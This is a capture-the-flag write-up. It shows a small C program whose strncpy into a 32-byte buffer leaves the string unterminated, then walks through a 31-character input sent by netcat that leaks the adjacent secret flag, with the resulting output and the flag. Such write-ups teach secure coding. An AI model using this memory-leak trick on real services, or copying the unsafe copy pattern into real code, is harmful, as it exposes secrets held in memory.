# Flag Checker, Baby

## Description

This program is perfectly safe, right? It only tells you what you already know. Check your flags:

`nc challs.rumble.host 53921`


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void check(const char *input, const char *secret_flag) {	
	char guess[32], flag[64];
	printf("sizeof(guess) -> %d\n", sizeof(guess));
	if (strlen(input) > sizeof(guess)) {
		puts("HACKER!");
		return;
	}

	strncpy(guess, input, sizeof(guess));
	strncpy(flag, secret_flag, sizeof(flag));
	if (!strcmp(guess, flag)) {
		printf("Well done! You got it: %s\n", flag);
	}
	else {
		printf("Wrong flag: %s\n", guess);
	}
}

int main(int argc, char** argv) {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);

	char *secret_flag = getenv("FLAG");
	if (!secret_flag) {
		puts("Flag not found, contact challenge authors.");
		return 1;
	}

	char input[128];
	printf("Enter the flag: ");
	fgets(input, sizeof(input), stdin);
	check(input, secret_flag);

	return 0;
}
```

## Solution

Let's analyze the code

We need to bypass this `if`, so our input must be under 33 char

```c
if (strlen(input) > sizeof(guess)) {
    puts("HACKER!");
    return;
}
```

This means that we can insert 31 random character and then the `\n`, inserted when we press `enter`

After that this is made

```c
strncpy(guess, input, sizeof(guess));
strncpy(flag, secret_flag, sizeof(flag));
```

In the first `strncpy` all the char are copyed, `\0` inclued, but in this way the `\0` would go in the first cell of the `flag` variable and when the 2nd `strncpy` is called, this char is replaced.

So this printf should print `input + \n + flag`

```c
printf("Wrong flag: %s\n", guess);
```

Let's try to pass 31 char to the programs

```console
$ nc challs.rumble.host 53921
Enter the flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wrong flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
CSR{should_have_used_strlcpy_instead}
```

As expected we get the flag

#### **FLAG >>** `CSR{should_have_used_strlcpy_instead}`